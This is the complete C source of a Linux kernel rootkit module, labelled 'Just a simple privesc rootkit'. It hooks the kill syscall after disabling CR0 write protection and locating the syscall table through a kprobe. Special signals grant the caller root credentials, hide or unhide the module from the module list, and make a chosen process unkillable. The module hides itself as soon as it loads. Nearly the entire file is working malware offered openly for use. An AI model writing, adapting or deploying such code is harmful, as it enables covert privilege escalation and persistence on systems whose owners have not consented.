#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/namei.h>
#include <linux/kprobes.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("s0ck37");
MODULE_DESCRIPTION("Just a simple privesc rootkit");
MODULE_VERSION("1.0");

// The kallsyms kprobe for lookup
static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name"
};

// The kallsyms function type and declaration
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
kallsyms_lookup_name_t kln;

// Variable to store the address of the syscall table
static unsigned long * __sys_call_table;

long super_pid = 0x00;

// Creating the hook function
typedef asmlinkage long (*orig_kill_t)(const struct pt_regs *);
orig_kill_t orig_kill;

// Variables for hiding the kernel module
static struct list_head *prev_module;
static short hidden = 0;

void show_module(void){

	// Show module
	list_add(&THIS_MODULE->list, prev_module);
	hidden = 0;
}

void hide_module(void){

	// Hide module
	prev_module = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	hidden = 1;
}

// Hooked function
asmlinkage int hook_kill(const struct pt_regs *regs){
	int signal = regs->si;
	long pid = (long)regs->di;

	// Set root for the process	
	if(signal == 64){
		struct cred *root;
		root = prepare_creds();
		if(root != NULL){
			root->uid.val = root->gid.val = 0;
			root->euid.val = root->egid.val = 0;
			root->suid.val = root->sgid.val = 0;
			root->fsuid.val = root->fsgid.val = 0;
			commit_creds(root);
			return 0;
		}
	}
	
	// Hiding or showing rootkit
	if(signal == 63){
		if(hidden){ show_module(); }
		else{ hide_module(); }
		return 0;
	}
	if(signal == 62){
		super_pid = pid;
		return 0;
	}
	if(pid == super_pid){
		return 0;
	}
	return orig_kill(regs);
}

static void disable_protection(void){
	
	// Disable cr0 protection
	unsigned long value;
	asm volatile("mov %%cr0,%0" : "=r" (value));
	if (value & 0x00010000) {
		value &= ~0x00010000;
		asm volatile("mov %0,%%cr0": : "r" (value));
	}
}

static void enable_protection(void){
	
	// Enable cr0 protection
	unsigned long value;
	asm volatile("mov %%cr0,%0" : "=r" (value));
	if (!(value & 0x00010000)) {
		value |= 0x00010000;
		asm volatile("mov %0,%%cr0": : "r" (value));
	}
}

static void hijack(void){

	// Overwriting original syscall with the hook
	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
	disable_protection();
	__sys_call_table[__NR_kill] = (unsigned long)hook_kill;
	enable_protection();
}

static int __init deadroot_init(void){

	// Hiding the module at start
	hide_module();
	
	// Building kallsyms_lookup_name since it has been removed from > 5.7 kernel
	register_kprobe(&kp);
	kln = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
	
	// Getting syscall table address
	__sys_call_table = (unsigned long *)kln("sys_call_table");

	// Hijcaking table
	hijack();
	return 0;
}

static void __exit deadroot_exit(void){
	
	// Writing back original syscall into syscall table
	disable_protection();
	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	enable_protection(); 
}

module_init(deadroot_init);
module_exit(deadroot_exit);
